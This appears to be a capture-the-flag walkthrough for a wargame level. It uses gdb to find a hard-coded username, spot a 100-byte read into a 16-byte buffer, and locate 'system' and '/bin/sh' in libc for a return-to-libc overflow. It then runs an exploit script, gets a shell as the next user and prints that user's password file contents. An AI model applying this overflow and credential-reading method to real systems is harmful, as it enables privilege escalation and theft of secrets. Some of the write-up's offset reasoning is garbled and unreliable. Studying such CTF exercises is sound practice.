---> gdb -q ./level01
Reading symbols from /home/users/level00/level00...(no debugging symbols found)...done.

Disassemble the main function
---> disas main
---> disas verify_user_name

The piece of code of interest is:
    0x0804847d <+25>:	mov    $0x80486a8,%eax

Display the memory contents at a given address
---> x/s 0x80486a8
    0x80486a8:	 "dat_wil"

So, username is dat_wil, password is need to be found

********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
password

---> disas verify_user_pass
The piece of code of interest is:
   0x080484ad <+10>:	mov    $0x80486b0,%eax

---> x/s 0x80486b0
    0x80486b0:	 "admin"

If we simply write "admin" it would not work as intended, we'll see error message "nope, incorrect username..."
The thing is no matter what pasword is entered program willnot call /bin/sh cause that how it works.

This line says that fget will read 0x64 (100) characters, when buffer's allocated size is only 16
   0x08048565 <+149>:   movl   $0x64,0x4(%esp)
---> p /d 0x64
    $8 = 100

Thus we can make buffer overflow attack,  

********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804857d in main ()
---> x/200xb $esp
...
0xffffd658:     0xac    0xd6    0xff    0xff    0x41    0x41    0x41    0x41
0xffffd660:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd668:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd670:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd678:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd680:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd688:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd690:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd698:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6a0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6a8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6b0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6b8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x00
...

so our buffer starts at 0xffffd658
We can also find that size is 92, and ends at 0xf7e4000a

---> info functions 
    ...
    0xf7e6aed0  system
    ...

---> info proc mappings
process 2152
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
---> find 0xf7e2c000, +0x1a0000, "/bin/sh"
    0xf7f897ec
    1 pattern found.

This info is used in pyton script, which will be copied and run
---> scp -P 4242 ./level01/exploit.py level01@localhost:/tmp/ 
---> ( python /tmp/exploit.py; cat ) | ./level01

$ whoami
level02
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
$ su level02
Password: 
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02

We found our flag!
